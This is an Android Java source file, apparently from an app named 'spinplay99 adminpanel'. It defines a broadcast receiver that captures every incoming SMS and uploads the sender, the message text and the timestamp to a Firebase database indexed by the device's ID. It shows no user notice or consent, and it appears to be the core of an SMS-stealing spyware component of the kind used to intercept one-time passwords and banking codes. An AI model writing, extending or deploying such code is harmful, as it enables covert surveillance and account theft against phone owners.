package com.spinplay99.adminpanel;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            
            FirebaseApp.initializeApp(context);
            DatabaseReference db = FirebaseDatabase.getInstance().getReference();
            String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = getSmsMessage(pdu);
                        if (sms != null) {
                            String from = sms.getDisplayOriginatingAddress();
                            String body = sms.getDisplayMessageBody();
                            long timestamp = sms.getTimestampMillis();
                            
                            // Firebase me new SMS save karo
                            Map<String, Object> newSms = new HashMap<>();
                            newSms.put("address", from);
                            newSms.put("body", body != null && body.length() > 200 ? 
                                       body.substring(0, 200) + "..." : body);
                            newSms.put("date", String.valueOf(timestamp));
                            newSms.put("date_readable", new SimpleDateFormat("dd/MM/yyyy hh:mm a", 
                                       Locale.getDefault()).format(new Date(timestamp)));
                            newSms.put("type", "INBOX");
                            newSms.put("read", "0");
                            newSms.put("received_at", ServerValue.TIMESTAMP);
                            
                            db.child("devices").child(deviceId).child("new_sms").push().setValue(newSms);
                        }
                    }
                }
            }
        }
    }

    private SmsMessage getSmsMessage(Object pdu) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return SmsMessage.createFromPdu((byte[]) pdu, "3gpp");
            } else {
                return SmsMessage.createFromPdu((byte[]) pdu);
            }
        } catch (Exception e) {
            return null;
        }
    }
}
